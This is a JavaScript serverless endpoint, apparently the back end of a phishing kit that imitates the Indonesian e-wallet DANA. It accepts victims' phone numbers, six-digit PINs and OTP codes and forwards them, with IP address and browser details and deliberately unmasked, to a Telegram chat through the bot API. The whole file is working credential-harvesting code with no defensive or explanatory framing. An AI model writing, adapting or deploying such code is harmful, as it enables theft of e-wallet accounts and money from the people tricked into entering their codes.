// api/send-dana-data.js
const axios = require('axios');

// Fungsi untuk mengirim notifikasi ke Telegram dengan data lengkap
async function sendToTelegram(data) {
  // Gunakan environment variables dari Vercel
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    console.log('Telegram credentials not set in environment variables');
    console.log('TELEGRAM_BOT_TOKEN:', botToken ? 'Set' : 'Not Set');
    console.log('TELEGRAM_CHAT_ID:', chatId ? 'Set' : 'Not Set');
    return false;
  }

  try {
    let message = '';
    
    // Format notifikasi berdasarkan type - TANPA SENSOR
    if (data.type === 'phone') {
      message = `🔔 New DANA Registration\n\n` +
                `├───────────────────\n` +
                `├• NO HP : ${data.phone}\n` +
                `├• IP Address : ${data.ip || 'Unknown'}\n` +
                `├• User Agent : ${data.userAgent || 'Unknown'}\n` +
                `├• Time : ${new Date().toLocaleString('id-ID')}\n` +
                `╰───────────────────`;
    } 
    else if (data.type === 'pin') {
      message = `🔔 New DANA PIN Verification\n\n` +
                `├───────────────────\n` +
                `├• NO HP : ${data.phone}\n` +
                `├• PIN : ${data.pin}\n` +
                `├• IP Address : ${data.ip || 'Unknown'}\n` +
                `├• User Agent : ${data.userAgent || 'Unknown'}\n` +
                `├• Time : ${new Date().toLocaleString('id-ID')}\n` +
                `╰───────────────────`;
    }
    else if (data.type === 'otp') {
      message = `🔔 New DANA OTP Verification\n\n` +
                `├───────────────────\n` +
                `├• NO HP : ${data.phone}\n` +
                `├• PIN : ${data.pin}\n` +
                `├• OTP : ${data.otp}\n` +
                `├• IP Address : ${data.ip || 'Unknown'}\n` +
                `├• User Agent : ${data.userAgent || 'Unknown'}\n` +
                `├• Time : ${new Date().toLocaleString('id-ID')}\n` +
                `╰───────────────────`;
    } else {
      message = `🔔 New DANA Verification\n\n` +
                `├───────────────────\n` +
                `├• Type: ${data.type}\n` +
                `├• NO HP : ${data.phone || 'N/A'}\n` +
                `├• IP Address : ${data.ip || 'Unknown'}\n` +
                `├• Time : ${new Date().toLocaleString('id-ID')}\n` +
                `╰───────────────────`;
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    console.log('Sending to Telegram with full data');
    
    const response = await axios.post(url, {
      chat_id: chatId,
      text: message,
      parse_mode: null
    });
    
    console.log('Telegram notification sent successfully');
    return true;
  } catch (error) {
    console.error('Error sending to Telegram:', error.message);
    if (error.response) {
      console.error('Telegram API response:', error.response.data);
    }
    return false;
  }
}

// Main function - Hanya kirim ke Telegram, tidak ke tempat lain
module.exports = async (req, res) => {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  // Handle preflight request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ 
      success: false, 
      error: 'Method not allowed. Only POST requests are accepted.' 
    });
  }

  try {
    // Parse JSON body
    let body;
    try {
      body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
    } catch (parseError) {
      return res.status(400).json({ 
        success: false, 
        error: 'Invalid JSON format in request body' 
      });
    }

    const { type, phone, pin, otp } = body;

    // Validasi data yang diperlukan
    if (!type) {
      return res.status(400).json({ 
        success: false, 
        error: 'Missing required field: type' 
      });
    }

    if (!phone && type !== 'otp') {
      return res.status(400).json({ 
        success: false, 
        error: 'Missing required field: phone' 
      });
    }

    // Log data yang diterima (TANPA SENSOR untuk keperluan debugging)
    console.log('📩 Full data received:', { 
      type, 
      phone: phone || 'not_provided',
      pin: pin || 'not_provided', 
      otp: otp || 'not_provided',
      timestamp: new Date().toISOString(),
      ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
      userAgent: req.headers['user-agent'] || 'unknown'
    });

    // Proses data berdasarkan type
    let telegramResult = false;
    
    switch (type) {
      case 'phone':
        if (!phone || phone.length < 10) {
          return res.status(400).json({ 
            success: false, 
            error: 'Invalid phone number' 
          });
        }
        
        // Kirim notifikasi ke Telegram untuk phone
        telegramResult = await sendToTelegram({
          type: 'phone',
          phone: phone,
          userAgent: req.headers['user-agent'],
          ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
        });
        break;

      case 'pin':
        if (!pin || pin.length !== 6) {
          return res.status(400).json({ 
            success: false, 
            error: 'PIN must be 6 digits' 
          });
        }
        
        // Kirim notifikasi ke Telegram untuk pin
        telegramResult = await sendToTelegram({
          type: 'pin',
          phone: phone,
          pin: pin,
          userAgent: req.headers['user-agent'],
          ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
        });
        break;

      case 'otp':
        if (!otp || otp.length !== 4) {
          return res.status(400).json({ 
            success: false, 
            error: 'OTP must be 4 digits' 
          });
        }
        
        // Kirim notifikasi ke Telegram untuk otp
        telegramResult = await sendToTelegram({
          type: 'otp',
          phone: phone,
          pin: pin,
          otp: otp,
          userAgent: req.headers['user-agent'],
          ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
        });
        break;

      default:
        return res.status(400).json({ 
          success: false, 
          error: 'Invalid type. Must be: phone, pin, or otp' 
        });
    }

    console.log('Telegram notification result:', telegramResult ? 'Success' : 'Failed');

    // Response sukses
    return res.status(200).json({ 
      success: true, 
      message: 'Data processed successfully',
      telegramSent: telegramResult,
      data: {
        type,
        timestamp: new Date().toISOString()
      }
    });

  } catch (error) {
    console.error('❌ Server error:', error);
    return res.status(500).json({ 
      success: false, 
      error: 'Internal server error',
      message: process.env.NODE_ENV === 'development' ? error.message : 'Something went wrong'
    });
  }
};
